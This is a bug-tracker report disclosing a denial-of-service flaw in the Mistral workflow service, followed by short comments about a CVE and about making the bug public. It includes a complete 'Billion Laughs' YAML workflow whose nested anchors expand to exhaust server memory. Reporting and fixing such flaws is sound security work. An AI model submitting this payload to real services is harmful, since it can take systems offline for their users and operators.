# Denial of service through YAML anchors expansion (Billion Laughs)

Bug #1785657 reported by
[Nassim](https://launchpad.net/~nassim-abbaoui)
on 2018-08-06

[272](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Mistral](https://bugs.launchpad.net/mistral) | Fix Released | High | [Eyal B](https://launchpad.net/~eyalb1) | [Mistral ussuri-2 "u-2"](https://launchpad.net/mistral/%2Bmilestone/ussuri-2) |

### Bug Description

It is possible to perform a denial of service on Mistral server by submitting a malicious workflow definition file (YAML) that contains nested anchors. This looks exactly like an XML Entity Expansion attack (<https://en.wikipedia.org/wiki/Billion_laughs_attack>).

Example of malicious workflow below:

version: '2.0'

wf1:

  type: direct

input:

    - a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]

    - b: &b [\*a,\*a,\*a,\*a,\*a,\*a,\*a,\*a,\*a]

    - c: &c [\*b,\*b,\*b,\*b,\*b,\*b,\*b,\*b,\*b]

    - d: &d [\*c,\*c,\*c,\*c,\*c,\*c,\*c,\*c,\*c]

    - e: &e [\*d,\*d,\*d,\*d,\*d,\*d,\*d,\*d,\*d]

    - f: &f [\*e,\*e,\*e,\*e,\*e,\*e,\*e,\*e,\*e]

    - g: &g [\*f,\*f,\*f,\*f,\*f,\*f,\*f,\*f,\*f]

    - h: &h [\*g,\*g,\*g,\*g,\*g,\*g,\*g,\*g,\*g]

    - i: &i [\*h,\*h,\*h,\*h,\*h,\*h,\*h,\*h,\*h]

tasks:

    hello:

      action: std.echo output="Hello"

      wait-before: 1

      publish:

        result: <% task(hello).result %>

Sorry, I just re-read this. I see this is related to YAML. Not YAQL. I have hidden my previous comment as it was confusing.

Not sure how security issues are usually handled here, will there be a CVE assigned to help tracking / identifying vulnerable versions ?

It's a serious one. There are also other ways to deny the service. We'll see what kind of protections to apply against such things.

Can we make this bug public now?

I don't think there is much value served in keeping it private. Those that are looking will know about this issue with regards to YAML and those that aren't looking as much (operating cloud platforms) probably won't know about the potential risks.
